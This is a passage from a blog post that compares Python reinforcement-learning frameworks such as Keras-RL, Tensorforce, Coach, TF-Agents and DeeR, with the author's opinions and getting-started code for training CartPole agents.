<h3 id="Getting-Started-3"><a href="#Getting-Started-3" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>The examples worked out of the box here and the only modifications I made were to use a mock Display and add some video recording of the tests. You can see that most of the code here is standard Keras code. The additions by Keras-RL aren’t really Keras related at all.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense, Activation, Flatten</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> Adam</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rl.agents.dqn <span class="keyword">import</span> DQNAgent</span><br><span class="line"><span class="keyword">from</span> rl.policy <span class="keyword">import</span> BoltzmannQPolicy</span><br><span class="line"><span class="keyword">from</span> rl.memory <span class="keyword">import</span> SequentialMemory</span><br><span class="line"></span><br><span class="line">ENV_NAME = <span class="string">&#x27;CartPole-v0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the environment and extract the number of actions.</span></span><br><span class="line">env = gym.make(ENV_NAME)</span><br><span class="line">np.random.seed(<span class="number">123</span>)</span><br><span class="line">env.seed(<span class="number">123</span>)</span><br><span class="line">nb_actions = env.action_space.n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Next, we build a very simple model.</span></span><br><span class="line">model = Sequential()</span><br><span class="line">model.add(Flatten(input_shape=(<span class="number">1</span>,) + env.observation_space.shape))</span><br><span class="line">model.add(Dense(<span class="number">16</span>))</span><br><span class="line">model.add(Activation(<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dense(<span class="number">16</span>))</span><br><span class="line">model.add(Activation(<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dense(<span class="number">16</span>))</span><br><span class="line">model.add(Activation(<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dense(nb_actions))</span><br><span class="line">model.add(Activation(<span class="string">&#x27;linear&#x27;</span>))</span><br><span class="line">print(model.summary())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally, we configure and compile our agent. You can use every built-in Keras optimizer and</span></span><br><span class="line"><span class="comment"># even the metrics!</span></span><br><span class="line">memory = SequentialMemory(limit=<span class="number">5000</span>, window_length=<span class="number">1</span>)</span><br><span class="line">policy = BoltzmannQPolicy()</span><br><span class="line">dqn = DQNAgent(model=model, nb_actions=nb_actions, memory=memory, nb_steps_warmup=<span class="number">10</span>,</span><br><span class="line">               target_model_update=<span class="number">1e-2</span>, policy=policy)</span><br><span class="line">dqn.<span class="built_in">compile</span>(Adam(lr=<span class="number">1e-3</span>), metrics=[<span class="string">&#x27;mae&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Okay, now it&#x27;s time to learn something! We visualize the training here for show, but this</span></span><br><span class="line"><span class="comment"># slows down training quite a lot. You can always safely abort the training prematurely using</span></span><br><span class="line"><span class="comment"># Ctrl + C.</span></span><br><span class="line">dqn.fit(env, nb_steps=<span class="number">2500</span>, visualize=<span class="literal">True</span>, verbose=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># After training is done, we save the final weights.</span></span><br><span class="line">dqn.save_weights(<span class="string">&#x27;dqn_&#123;&#125;_weights.h5f&#x27;</span>.<span class="built_in">format</span>(ENV_NAME), overwrite=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally, evaluate our algorithm for 5 episodes.</span></span><br><span class="line">dqn.test(Monitor(env, <span class="string">&#x27;.&#x27;</span>), nb_episodes=<span class="number">5</span>, visualize=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h2 id="TRFL"><a href="#TRFL" class="headerlink" title="TRFL"></a><a href="https://github.com/deepmind/trfl">TRFL</a></h2><p><img src="https://img.shields.io/github/stars/deepmind/trfl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/deepmind/trfl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/deepmind/trfl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/deepmind/trfl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/deepmind/trfl.svg?style=flat-square" alt=""></p>
<p>TRFL is an opinionated extension to Tensorflow by Deepmind (so NOGP then ;-) ). Given the credentials you would have expected it to be popular, but the first thing you notice is the distinct lack of commits. Then the distinct <a href="https://github.com/deepmind/trfl/issues/17">lack of examples and Tensorflow 2.0 support</a>.</p>
<p>The main issue is that it is too low-level. It’s the exact opposite of Keras-RL. The functionality that TRFL provides is a few helper functions, a <a href="https://github.com/deepmind/trfl/blob/master/trfl/action_value_ops.py#L40">q-learning value function</a> for example, which takes in a load of Tensorflow Tensors with abstract names.</p>
<h3 id="Getting-Started-4"><a href="#Getting-Started-4" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>I recommend taking a quick look at <a href="https://colab.research.google.com/drive/1r_SGbDBzEaKeijJFExgPTOcaglZcD0-S#scrollTo=627LbtjyZmYX">this Notebook</a> as an example. But note that the code is very low level.</p>
<h2 id="Tensorforce"><a href="#Tensorforce" class="headerlink" title="Tensorforce"></a><a href="https://github.com/tensorforce/tensorforce">Tensorforce</a></h2><p><img src="https://img.shields.io/github/stars/tensorforce/tensorforce.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/tensorforce/tensorforce.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/tensorforce/tensorforce.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/tensorforce/tensorforce.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/tensorforce/tensorforce.svg?style=flat-square" alt=""></p>
<p>Tensorforce has similar aims to <a href="##TRFL">TRFL</a>. It attempts to abstract RL primitives whilst targeting Tensorflow. By using Tensorflow then you gain all of the benefits of using Tensorflow, i.e. graph models, easier, cross-platform deployment.</p>
<p>There are four high-level abstractions of an <a href="https://github.com/tensorforce/tensorforce/blob/master/tensorforce/environments/environment.py"><code>Environment</code></a>, <a href="https://github.com/tensorforce/tensorforce/blob/master/tensorforce/execution/runner.py"><code>Runner</code></a>, <a href="https://github.com/tensorforce/tensorforce/blob/master/tensorforce/agents/agent.py"><code>Agent</code></a> and <a href="https://github.com/tensorforce/tensorforce/blob/master/tensorforce/models/model.py"><code>Model</code></a>. These mostly do what you would expect, but the “Model” abstraction is not something you would normally see. A <code>Model</code> sits within an <code>Agent</code> and defines the policy of the agent. This is nice because, for example, the standard <a href="https://github.com/tensorforce/tensorforce/blob/master/tensorforce/models/q_model.py">Q-learning model</a> can be overridden by the <a href="https://github.com/tensorforce/tensorforce/blob/master/tensorforce/models/q_nstep_model.py">Q-learning n-step model</a>, only changing one small function. This is precisely the middle ground between TRFL and Keras that I was looking for. And it’s implemented in an OOP way, which some people will like, others wont. But at least the abstraction is there.</p>
<p>The downside of libraries like this, or any DL focused RL library, is that much of the code is complicated by the underlying DL framework. The same is true here. For example, the <a href="https://github.com/tensorforce/tensorforce/blob/major-revision/tensorforce/core/models/random_model.py">random model</a>, i.e. one that chooses a random action, something that should take precisely one line of code, is 79 lines long. I’m being a little facetious here (license, class boilerplate, newlines, etc.) but hopefully you understand my point.</p>
<p>It also means that there is no implementation of “simple” RL algorithms, i.e. those that don’t use models. E.g. entropy, bandits, simple MDPs, SARSA, some tabular methods, etc. And the reason for this is that you don’t need a DL framework for these models.</p>
<p>So in summary, I think the level of abstraction is spot on. But the benefits/problems of limiting yourself to a DL framework remain.</p>
<p>Note that this is based upon version <code>0.4.3</code> and a major rewrite is underway.</p>
<h3 id="Getting-Started-5"><a href="#Getting-Started-5" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>The getting started example is sensible. We’re creating an environment, an agent and a runner (the thing that actually does the training). The specifications for the agent is a little different though. It reminds me of the <a href="##google\ dopamine">Dopamine</a> Gin config, except it’s using standard json. In the example I’m getting those specifications from their examples directory, but you can imagine how easy it would be to run a hyperparameter search using them.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">environment = OpenAIGym(</span><br><span class="line">    gym_id=<span class="string">&quot;CartPole-v0&quot;</span>,</span><br><span class="line">    monitor=<span class="string">&quot;.&quot;</span>,</span><br><span class="line">    monitor_safe=<span class="literal">False</span>,</span><br><span class="line">    monitor_video=<span class="number">10</span>,</span><br><span class="line">    visualize=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> urllib.request.urlopen(<span class="string">&quot;https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/dqn.json&quot;</span>) <span class="keyword">as</span> url:</span><br><span class="line">  agent = json.loads(url.read().decode())</span><br><span class="line">  print(agent)</span><br><span class="line"><span class="keyword">with</span> urllib.request.urlopen(<span class="string">&quot;https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/mlp2_network.json&quot;</span>) <span class="keyword">as</span> url:</span><br><span class="line">  network = json.loads(url.read().decode())</span><br><span class="line">  print(network)</span><br><span class="line"></span><br><span class="line">agent = Agent.from_spec(</span><br><span class="line">  spec=agent,</span><br><span class="line">  kwargs=<span class="built_in">dict</span>(</span><br><span class="line">    states=environment.states,</span><br><span class="line">    actions=environment.actions,</span><br><span class="line">    network=network</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">runner = Runner(</span><br><span class="line">    agent=agent,</span><br><span class="line">    environment=environment,</span><br><span class="line">    repeat_actions=<span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">runner.run(</span><br><span class="line">    num_timesteps=<span class="number">200</span>,</span><br><span class="line">    num_episodes=<span class="number">200</span>,</span><br><span class="line">    max_episode_timesteps=<span class="number">200</span>,</span><br><span class="line">    deterministic=<span class="literal">True</span>,</span><br><span class="line">    testing=<span class="literal">False</span>,</span><br><span class="line">    sleep=<span class="literal">None</span></span><br><span class="line">)</span><br><span class="line">runner.close()</span><br></pre></td></tr></table></figure>
<h2 id="Facebook-Horizon"><a href="#Facebook-Horizon" class="headerlink" title="Facebook Horizon"></a><a href="https://github.com/facebookresearch/Horizon">Facebook Horizon</a></h2><p><img src="https://img.shields.io/github/stars/facebookresearch/Horizon.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/facebookresearch/Horizon.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/facebookresearch/Horizon.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/facebookresearch/Horizon.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/facebookresearch/Horizon.svg?style=flat-square" alt=""></p>
<p>Horizon is a framework from Facebook that is dominated by PyTorch. Another DL focused library then. Also:</p>
<blockquote>
<p>The main use case of Horizon is to train RL models in the batch setting. &hellip; Specifically, we try to learn the best possible policy given the input data.</p>
</blockquote>
<p>So like other frameworks the focus is off-policy, model driven RL with DL in the model. But this is differentiated due to the use of PyTorch. You could also compare this to Keras-RL using PyTorch as the backend for Keras.</p>
<p>I’ve already discussed the cons of such a focused framework in the <a href="##tensorforce">Tensorforce</a> section, so I won’t state them again.</p>
<p>There are several interesting differences though. There is no tight Gym integration. Instead they intentionally decouple the two by dumping Gym data into JSON, then reading the JSON back into the agent. This might sound verbose, but is actually really good for <a href="https://en.wikipedia.org/wiki/Loose_coupling">decoupling</a> and therefore more scalable, less fragile and more flexible. The downside is that there are more hoops to jump through due to the increased complexity.</p>
<p>However, as inconceivable as it sounds, there is no pip installer for Horizon. You have to use conda, install onnx, install java, setup the <code>JAVA_HOME</code> to point to conda, install Spark, install Gym (fair enough), install Apache thrift and then build Horizon. Wow. (Bonus points if you counted how many steps that was).</p>
<p>So I think it suffice to say that I’m not going to attempt to install this in the demo Notebook.</p>
<h3 id="Getting-Started-6"><a href="#Getting-Started-6" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>You’ll need a lot of time and a lot of patience. Follow <a href="https://horizonrl.com/installation.html">the build instructions</a>, then follow <a href="https://horizonrl.com/usage.html#offline-rl-training-batch-rl">the training guide</a>. I can’t vouch for it because I have a life to get on with.</p>
<h2 id="Nervana-Systems-Coach"><a href="#Nervana-Systems-Coach" class="headerlink" title="Nervana Systems Coach"></a><a href="https://github.com/NervanaSystems/coach">Nervana Systems Coach</a></h2><p><img src="https://img.shields.io/github/stars/NervanaSystems/coach.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/NervanaSystems/coach.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/NervanaSystems/coach.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/NervanaSystems/coach.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/NervanaSystems/coach.svg?style=flat-square" alt=""></p>
<p>The first thing you will notice when you look at this framework is the <a href="https://github.com/NervanaSystems/coach#supported-algorithms">number of implemented algorithms</a>. It is colossal and must have taken several people many weeks to implement. The second thing you will notice is the <a href="https://github.com/NervanaSystems/coach#supported-environments">number of integrated Environments</a>. Considering how much time this must have taken, it gives a lot of hope for the rest of the framework.</p>
<p>It comes with a <a href="https://nervanasystems.github.io/coach/dashboard.html">dedicated dashboard</a> which looks pretty nice. Most of the other frameworks rely on the Tensorboard project.</p>
<p>One particular wow feature that I haven’t seen before, is <a href="https://nervanasystems.github.io/coach/components/orchestrators/index.html">inbuilt deployment for Kubernetes</a>. I think that the orchestration of Coach by Coach is a step too far, but the fact that they’ve even thought about it means that it is probably scalable enough to deploy onto Kuberentes with standard tooling.</p>
<p>The level of modularity is astounding. For example there are classes that implement all sorts of <a href="https://nervanasystems.github.io/coach/components/exploration_policies/index.html">exploration strategies</a> and allow you to make all sorts of changes to the <a href="https://nervanasystems.github.io/coach/design/network.html">various model designs</a>.</p>
<p>The ONLY thing that I can think of that is a little annoying is the same limitation of forcing me to use DL as the model. I remain convinced that a subset of simpler applications do not require anything nearly as complex as DL and could benefit for more traditional Regression methods. However, I’m sure it should be reasonably easy to add in a little stub class that removes the DL stuff.</p>
<p>Interestingly, the framework <a href="https://nervanasystems.github.io/coach/usage.html#switching-between-deep-learning-frameworks">supports Tensorflow and MXNet</a> due to it’s use of Keras. This means that PyTorch is not supported, because Keras doesn’t support PyTorch.</p>
<p>Frankly, I can’t understand why this framework is so unpopular in any way of measuring it. In terms of stars. In terms of the <a href="https://www.google.com/search?q=" title="nervana+systems+coach">number of google pages</a> (the answer is 7, if you are wondering). Compare that to <a href="https://www.google.com/search?q=" title="google+dopamine">Google Dopamine</a> for example, with 16500 pages.</p>
<p>It is certainly the most comprehensive framework with the best documentation and a fantastic level of modularity. They’ve even got a ❤️ <a href="https://github.com/NervanaSystems/coach/blob/v0.12.1/tutorials/0.%20Quick%20Start%20Guide.ipynb">Getting Started Notebook</a> ❤️.</p>
<h2 id="Getting-Started-7"><a href="#Getting-Started-7" class="headerlink" title="Getting Started"></a>Getting Started</h2><p>There are two important notes I’d like to point out. First, make sure you are looking at a tagged version of the documentation or the demos. There are some new features in the master branch that don’t work with a pip installed version. Second, it depends on OpenAI Gym version <code>0.12.5</code>, which isn’t installed in colab. You’ll need to run <code>!pip install gym==0.12.5</code> and restart the runtime.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.reset_default_graph() <span class="comment"># So that we don&#x27;t get an error for TF when we re-run</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rl_coach.agents.clipped_ppo_agent <span class="keyword">import</span> ClippedPPOAgentParameters</span><br><span class="line"><span class="keyword">from</span> rl_coach.environments.gym_environment <span class="keyword">import</span> GymVectorEnvironment</span><br><span class="line"><span class="keyword">from</span> rl_coach.graph_managers.basic_rl_graph_manager <span class="keyword">import</span> BasicRLGraphManager</span><br><span class="line"><span class="keyword">from</span> rl_coach.graph_managers.graph_manager <span class="keyword">import</span> ScheduleParameters</span><br><span class="line"><span class="keyword">from</span> rl_coach.core_types <span class="keyword">import</span> TrainingSteps, EnvironmentEpisodes, EnvironmentSteps</span><br><span class="line"><span class="keyword">from</span> rl_coach.base_parameters <span class="keyword">import</span> VisualizationParameters</span><br><span class="line"><span class="keyword">global</span> experiment_path; experiment_path = <span class="string">&#x27;.&#x27;</span> <span class="comment"># Because of some bizzare global in the mp4 dumping code</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom schedule to speed up training. We don&#x27;t really care about the results.</span></span><br><span class="line">schedule_params = ScheduleParameters()</span><br><span class="line">schedule_params.improve_steps = TrainingSteps(<span class="number">200</span>)</span><br><span class="line">schedule_params.steps_between_evaluation_periods = EnvironmentSteps(<span class="number">200</span>)</span><br><span class="line">schedule_params.evaluation_steps = EnvironmentEpisodes(<span class="number">10</span>)</span><br><span class="line">schedule_params.heatup_steps = EnvironmentSteps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">graph_manager = BasicRLGraphManager(</span><br><span class="line">    agent_params=ClippedPPOAgentParameters(),</span><br><span class="line">    env_params=GymVectorEnvironment(level=<span class="string">&#x27;CartPole-v0&#x27;</span>),</span><br><span class="line">    schedule_params=schedule_params,</span><br><span class="line">    vis_params=VisualizationParameters(dump_mp4=<span class="literal">True</span>) <span class="comment"># So we can dump the video</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h2 id="MAgent"><a href="#MAgent" class="headerlink" title="MAgent"></a><a href="https://github.com/geek-ai/MAgent">MAgent</a></h2><p><img src="https://img.shields.io/github/stars/geek-ai/MAgent.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/geek-ai/MAgent.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/geek-ai/MAgent.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/geek-ai/MAgent.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/geek-ai/MAgent.svg?style=flat-square" alt=""></p>
<p>MAgent is a framework that allows you to solve many-agent RL problems. This is a completely different aim compared to all the other “traditional” RL frameworks that use only a single or very few agents. They claim it can scale up to millions of agents.</p>
<p>But again, no pip installer. Please, everyone, create pip installers for you projects. It’s vitally important for ease of use and therefore project traction. I guess it’s because the whole project is written in C, presumably for performance reasons.</p>
<p>It’s using Tensorflow under the hood and builds its own gridworld-like enironment. The Agents are designed with “real-life” simulations in mind. For example you can specify the size of the agent, how far it can see; things like that. The observations that are passed to the Agents are grids. The actions that they can take are limited to moving, attacking and turning. They are rewarded according to a flexible rule definition.</p>
<p>In short, the framework is setup to handle game of life style games out of the box, with some extra modularity on how the agents behave and are rewarded. Due to this we can use some of the more advanced DL methods to train the agents to perform complex, coordinated tasks. Like surround prey so that it can’t move. You can learn more in the <a href="https://github.com/geek-ai/MAgent/blob/master/doc/get_started.md">getting started guide</a>.</p>
<p>I am very impressed with the idea. But as you can see from the Github stats above, 4 commits a year basically means that it is hardly being used. The last major updates were in 2017. This is a shame, because it represents something very different compared to the other frameworks. It would be great if someone could make it easier to use, or replicate the framework in idiomatic Python, so that it becomes easier to use.</p>
<h3 id="Getting-Started-8"><a href="#Getting-Started-8" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>So I almost got it working in the Notebook. I tried a few examples from the <a href="https://github.com/geek-ai/MAgent/blob/master/doc/get_started.md">getting started guide</a>. The training version takes hours, so I bailed on that quite quickly. The <code>examples/api_demo.py</code> however is just testing the learnt models, so that is lightning quick.</p>
<p>However, it renders the environment in some proprietary text format. You need to run a random webserver binary that parses and hosts the render in the browser. Because we’re in colab, it doesn’t allow you to run a webserver. So I tried downloading the files, but we built the binaries on colab, not on a mac, so I wasn’t able to run the binary.</p>
<p>So that was a bit frustrating. It would have been much simpler if it had just rendered it in some standard format like mp4 of a gif or something. And also disappointing, because I was looking forward to generating some complex behavior.</p>
<p>But just so you are not disappointed, here is some eye candy from the author. Please excuse the <a href="www.youtube.com/embed/HCSm0kVolqI">audio</a>!</p>
<p>And here are the remains of the code that worked:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">!git <span class="built_in">clone</span> https://github.com/geek-ai/MAgent.git</span><br><span class="line">!sudo apt-get install cmake libboost-system-dev libjsoncpp-dev libwebsocketpp-dev</span><br><span class="line">%<span class="built_in">cd</span> MAgent</span><br><span class="line">!bash build.sh</span><br><span class="line"></span><br><span class="line">!PYTHONPATH=$(<span class="built_in">pwd</span>)/python:<span class="variable">$PYTHONPATH</span> python examples/api_demo.py</span><br></pre></td></tr></table></figure>
<p>You can exchange that last call to any of the python files in teh examples folder.</p>
<h2 id="TF-Agents"><a href="#TF-Agents" class="headerlink" title="TF-Agents"></a><a href="https://github.com/tensorflow/agents">TF-Agents</a></h2><p><img src="https://img.shields.io/github/stars/tensorflow/agents.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/tensorflow/agents.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/tensorflow/agents.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/tensorflow/agents.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/tensorflow/agents.svg?style=flat-square" alt=""></p>
<p>Tensorflow-Agents (TF-Agents) is another <a href="##google\ dopamine">NOGP</a> from Google with the focus squarely on Tensorflow. So treat this as direct competition to <a href="##trfl">TRFL</a>, <a href="##tensorforce">Tensorforce</a> and <a href="##google\ dopamine">Dopamine</a>.</p>
<p>Which begs the question: why have more Google employees created another Tensorflow-abstraction-for-RL when TRFL and Dopamine already exist? In an <a href="https://github.com/tensorflow/agents/issues/15">issue discussing the relationship between TF-Agents and Dopamine</a> the contributors suggest that:</p>
<blockquote>
<p>it seems that Dopamine and TF-Agent strongly overlap. Although dopamine aims at being used for fast prototyping and benchmarking as the reproducibility has been put at the core of the project, whereas TF-Agent would be more used for production-level reinforcement learning algorithms.</p>
</blockquote>
<p>To be honest, I’m not sure what “production-level” means at this point. There are some <a href="https://github.com/tensorflow/agents/tree/master/tf_agents/colabs">great colab examples</a>, but there is no documentation. And you certainly shouldn’t be using Notebooks in production.</p>
<p>Once you start digging into the examples, then it becomes clear that the code is very Tensorflow heavy. For example, the <a href="https://github.com/tensorflow/agents/blob/master/tf_agents/colabs/1_dqn_tutorial.ipynb">simple Cartpole example</a> has a lot of lines of code. Mainly because there is a lot of explanation and debuging code in there, but it looks like a sign of things to come.</p>
<p>I must admit though, the code does look very nice. It’s nicely separated and the modularity looks good. All the abstractions you would expect are there. The only thing I want to pick on is the <a href="https://github.com/tensorflow/agents/blob/master/tf_agents/agents/tf_agent.py"><code>Agent</code> abstraction</a>. This is the base class and it is directly coupled to Tensorflow. It is a Tensorflow module. This adds a significant amount of complexity and I wish that it was abstracted away so I didn’t have to worry about it until I need it. The same is true for the vast majority of other abstractions; they are all Tensorflow modules.</p>
<p>With that said, it is clear that this is a far more serious and capable library than <a href="##trfl">TRFL</a>.</p>
<h3 id="Getting-Started-9"><a href="#Getting-Started-9" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>There is already an <a href="https://github.com/tensorflow/agents/tree/master/tf_agents/colabs">extensive set of Notebooks available in their repository</a>, so I won’t waste time just copy and pasting here. You can also run them <a href="https://colab.research.google.com/github/tensorflow/agents/blob/master/tf_agents/colabs/1_dqn_tutorial.ipynb">directly in colab too</a>.</p>
<p>The video below shows three episodes of the cartpole. To me it looks like it is having a fit. Constant nudges to rebalance.</p>
<h2 id="SLM-Lab"><a href="#SLM-Lab" class="headerlink" title="SLM-Lab"></a><a href="https://github.com/kengz/SLM-Lab">SLM-Lab</a></h2><p><img src="https://img.shields.io/github/stars/kengz/SLM-Lab.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/kengz/SLM-Lab.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/kengz/SLM-Lab.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/kengz/SLM-Lab.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/kengz/SLM-Lab.svg?style=flat-square" alt=""></p>
<p>SLM-Lab is modular RL framework based upon PyTorch. It appears to be aimed more towards researchers. They stress the importance of modularity, but <a href="https://github.com/kengz/SLM-Lab#simplicity">rightly state that</a> being simple and modular is probably not possible; it is a compromise between the two. Interestingly it also uses <a href="##RLLib\ via\ ray-project">the Ray project</a> under the hood to make it scalable.</p>
<p>Despite starting in 2017, the small number of contributors and the relative popularity in terms of github stars, there is lots of activity. The vast majority of the commits are one-liners, but the commitment by the authors is amazing.</p>
<p>Unfortunately this is another non-pip install framework and attempts to install a whole load of build related C libraries and miniconda. Which is problematic in colab. Being a good Engineer I ignored all the documentation and tried to get it working myself through trial and error. It almost worked, but I <a href="https://github.com/kengz/SLM-Lab/issues/373">stumbled across a problem when initialising pytorch</a> that I didn’t know how to fix.</p>
<p>So unfortunately, again, you will have to settle for an example image from the authors.</p>
<p><img src="https://user-images.githubusercontent.com/8209263/49688875-87e56e80-facd-11e8-90be-9d6be7bace03.gif" alt=""></p>
<p>I struggled a bit with the documentation. The <a href="https://kengz.gitbooks.io/slm-lab/content/usage/aeb-design.html">architecture documentation</a> is limited and the rest is focused towards usage. But by usage I mean <a href="https://kengz.gitbooks.io/slm-lab/content/usage/spec-file.html">running experiments on current implementations</a>. I struggled to find the documentation that told me how to plug modules together in different ways. I presume they intend that this should be done via the JSON spec files. Indeed the original motivation was:</p>
<blockquote>
<p>There was a need for a framework that would allow us to compare algorithms and environments, quickly set up experiments to test hypotheses, reuse components, analyze and compare results, log results.</p>
</blockquote>
<p>So the goal here is to allow reuse via configuration, much like <a href="##google\ dopamine">Dopamine</a> and <a href="##tensorforce">Tensorforce</a>. This “RL as configuration” seems to be a theme! However, I’m not convinced. I would argue that code is more idiomatic, more flexible. It is what people are used to. Every time you do something via configuration that is another <em>Domain Specific Language</em> (DSL) that users have to learn. And because that DSL is generally static (Gin is not) then the implementation of the DSL sets the limitation. It is never going to suit everyone because there will be an edge case that isn’t covered by the DSL.</p>
<h2 id="DeeR"><a href="#DeeR" class="headerlink" title="DeeR"></a><a href="https://github.com/VinF/deer">DeeR</a></h2><p><img src="https://img.shields.io/github/stars/VinF/deer.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/VinF/deer.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/VinF/deer.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/VinF/deer.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/VinF/deer.svg?style=flat-square" alt=""></p>
<p>The initial impression of DeeR is a good one. It has a pip installer. It waxes lyrical about modularity. It has only <strong>two</strong> Python dependencies; <code>numpy</code> and <code>Joblib</code>. So no nasty C make process to get it working, great!</p>
<p>The documentation is clear, but is missing some overall architecture documentation. You have to dig into the classes/code to find the documentation. But when you do it is good.</p>
<p>The “modules” are split mostly in the way you would expect. Modules for the <a href="https://deer.readthedocs.io/en/master/modules/environments.html"><code>Environment</code></a>, <a href="https://deer.readthedocs.io/en/master/modules/agents.html"><code>Agent</code></a>, and <a href="https://deer.readthedocs.io/en/master/modules/policies.html"><code>Policies</code></a>.</p>
<p>There is an interesting class called <a href="https://deer.readthedocs.io/en/master/modules/controllers.html"><code>Controller</code></a> which is not standard. This class provides lifecycle hooks that you can attach to; events like the end of an episode or whenever an action is taken. For example, if you wanted to do some logging at the end of an episode, then you could subclass this class and override the <a href="https://github.com/VinF/deer/blob/master/deer/experiment/base_controllers.py#L52"><code>onEpisodeEnd</code></a>. There are several example controllers, one of which is an <a href="https://github.com/VinF/deer/blob/master/deer/experiment/base_controllers.py#L149"><code>EpsilonController</code></a>. This allows you to dymaically alter the <code>eta</code> or <code>epsilon</code> value in e-greedy algorithms.</p>
<p>This is quite powerful as it allows you to alter the learning process in mid flight. But from a Software Engineering perspective this is quite risky. Any Functional Programmer will tell you not to mutate the state of another object because “Dragons be here”. It would have been nicer if the API was more functional and you could pass in functions that computed, for example, the agent’s next <code>eta</code>, rather than mutating the state of the agent directly. This may make it slightly more complex, though.</p>
<p>The framework also contains a <a href="https://deer.readthedocs.io/en/master/modules/learning-algorithms.html">few learning algorithms</a> but it’s certainly not as comprehensive as something like <a href="##coach">Coach</a>.</p>
<h3 id="Getting-Started-10"><a href="#Getting-Started-10" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>Thanks to the pip install and very few dependencies, this was probably the easiest framework to get up and running.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">!pip install git+git://github.com/VINF/deer.git@master</span><br><span class="line">!git <span class="built_in">clone</span> https://github.com/VinF/deer.git</span><br></pre></td></tr></table></figure>
<p>I cloned the git repo so I could run the examples. Then it’s just a case of importing everything:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%cd /content/deer/examples/toy_env</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> deer.agent <span class="keyword">import</span> NeuralAgent</span><br><span class="line"><span class="keyword">from</span> deer.learning_algos.q_net_keras <span class="keyword">import</span> MyQNetwork</span><br><span class="line"><span class="keyword">from</span> Toy_env <span class="keyword">import</span> MyEnv <span class="keyword">as</span> Toy_env</span><br><span class="line"><span class="keyword">import</span> deer.experiment.base_controllers <span class="keyword">as</span> bc</span><br></pre></td></tr></table></figure>
<p>And stealing the example:</p>
